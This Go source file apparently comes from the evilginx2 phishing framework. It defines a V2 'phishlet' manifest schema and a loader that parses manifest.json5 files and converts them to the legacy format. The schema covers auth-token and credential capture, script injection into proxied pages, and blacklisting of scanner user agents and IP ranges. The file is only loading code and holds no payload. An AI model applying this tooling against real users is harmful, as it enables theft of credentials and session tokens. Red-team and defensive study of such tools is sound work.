package core

import (
	"io/ioutil"
	"os"
	"path/filepath"
	"sync"

	"github.com/kgretzky/evilginx2/log"
	"github.com/titanous/json5"
)

type PhishletV2 struct {
	Meta        PhishletMeta      `json:"meta"`
	ProxyHosts  []ConfigProxyHost `json:"proxy_hosts"`
	SubFilters  []ConfigSubFilter `json:"sub_filters"`
	AuthTokens  []ConfigAuthToken `json:"auth_tokens"`
	Credentials ConfigCredentials `json:"credentials"`
	Login       ConfigLogin       `json:"login"`
	ForcePost   []ConfigForcePost `json:"force_post"`
	StaticFiles StaticFilesConfig `json:"static_files"`
	Options     PhishletOptions   `json:"options"`
	RewriteURLs []URLRewriteRule  `json:"rewrite_urls"`
	Dir         string            `json:"-"`
}

type PhishletMeta struct {
	Name        string   `json:"name"`
	DisplayName string   `json:"display_name"`
	Version     string   `json:"version"`
	Author      string   `json:"author"`
	Description string   `json:"description"`
	Tags        []string `json:"tags"`
}

type StaticFilesConfig struct {
	Scripts []StaticScript `json:"scripts"`
	Styles  []StaticStyle  `json:"styles"`
	Assets  []StaticAsset  `json:"assets"`
}

type StaticScript struct {
	Path            string `json:"path"`
	InjectAt        string `json:"inject_at"`
	InjectPosition  string `json:"inject_position"`
	InjectCondition string `json:"inject_condition"`
	Inline          bool   `json:"inline"`
}

type StaticStyle struct {
	Path           string `json:"path"`
	InjectAt       string `json:"inject_at"`
	InjectPosition string `json:"inject_position"`
	Inline         bool   `json:"inline"`
}

type StaticAsset struct {
	Path     string `json:"path"`
	ServeAt  string `json:"serve_at"`
	MimeType string `json:"mime_type"`
	Cache    bool   `json:"cache"`
}

type PhishletOptions struct {
	Enabled       bool                    `json:"enabled"`
	Visible       bool                    `json:"visible"`
	Hooks         HooksConfig             `json:"hooks"`
	Blacklist     PhishletBlacklistConfig `json:"blacklist"`
	CustomHeaders CustomHeaders           `json:"custom_headers"`
}

type HooksConfig struct {
	OnRequest  string `json:"on_request"`
	OnResponse string `json:"on_response"`
}

type PhishletBlacklistConfig struct {
	UserAgents []string `json:"user_agents"`
	IPRanges   []string `json:"ip_ranges"`
}

type CustomHeaders struct {
	Request  map[string]string `json:"request"`
	Response map[string]string `json:"response"`
}

type PhishletV2Loader struct {
	phishletsDir string
	phishlets    map[string]*PhishletV2
	mu           sync.RWMutex
}

func NewPhishletV2Loader(dir string) *PhishletV2Loader {
	return &PhishletV2Loader{
		phishletsDir: dir,
		phishlets:    make(map[string]*PhishletV2),
	}
}

func (l *PhishletV2Loader) LoadAll() error {
	l.mu.Lock()
	defer l.mu.Unlock()

	if _, err := os.Stat(l.phishletsDir); os.IsNotExist(err) {
		return nil
	}

	files, err := ioutil.ReadDir(l.phishletsDir)
	if err != nil {
		return err
	}

	for _, f := range files {
		if f.IsDir() {
			manifestPath := filepath.Join(l.phishletsDir, f.Name(), "manifest.json5")
			if _, err := os.Stat(manifestPath); err == nil {
				p, err := l.loadPhishlet(manifestPath)
				if err != nil {
					log.Error("failed to load phishlet %s: %v", f.Name(), err)
					continue
				}
				l.phishlets[p.Meta.Name] = p
			}
		}
	}
	return nil
}

func (l *PhishletV2Loader) loadPhishlet(path string) (*PhishletV2, error) {
	data, err := ioutil.ReadFile(path)
	if err != nil {
		return nil, err
	}

	var p PhishletV2
	if err := json5.Unmarshal(data, &p); err != nil {
		return nil, err
	}

	p.Dir = filepath.Dir(path)
	return &p, nil
}

func (l *PhishletV2Loader) GetPhishlet(name string) (*PhishletV2, bool) {
	l.mu.RLock()
	defer l.mu.RUnlock()
	p, ok := l.phishlets[name]
	return p, ok
}

func (l *PhishletV2Loader) ListPhishlets() []string {
	l.mu.RLock()
	defer l.mu.RUnlock()
	var names []string
	for name := range l.phishlets {
		names = append(names, name)
	}
	return names
}

func (l *PhishletV2Loader) GetPhishletCount() int {
	l.mu.RLock()
	defer l.mu.RUnlock()
	return len(l.phishlets)
}

// ToLegacyPhishlet converts V2 phishlet to legacy Phishlet struct
func (v2 *PhishletV2) ToLegacyPhishlet() *Phishlet {
	p := &Phishlet{}
	p.Clear()
	p.Name = v2.Meta.Name
	p.Author = v2.Meta.Author

	// Create ConfigPhishlet from V2 data
	cfg := ConfigPhishlet{
		Name:        v2.Meta.Name,
		RedirectUrl: "", // V2 doesn't seem to have RedirectUrl in root, maybe in options?
		ProxyHosts:  &v2.ProxyHosts,
		SubFilters:  &v2.SubFilters,
		AuthTokens:  &v2.AuthTokens,
		Credentials: &v2.Credentials,
		LoginItem:   &v2.Login,
		ForcePosts:  &v2.ForcePost,
		RewriteURLs: &v2.RewriteURLs,
	}

	// Load from config
	err := p.LoadFromConfig(cfg, nil)
	if err != nil {
		log.Error("failed to convert V2 phishlet %s to legacy format: %v", v2.Meta.Name, err)
		return nil
	}

	// Set version manually as LoadFromConfig doesn't handle it (it was in LoadFromFile)
	// We need to parse version string "X.Y.Z"
	// Since parseVersion is private method of Phishlet, we can't call it easily if we were outside package.
	// But we are in 'core' package.
	ver, err := p.parseVersion(v2.Meta.Version)
	if err == nil {
		p.Version = ver
	}

	p.V2 = v2

	return p
}
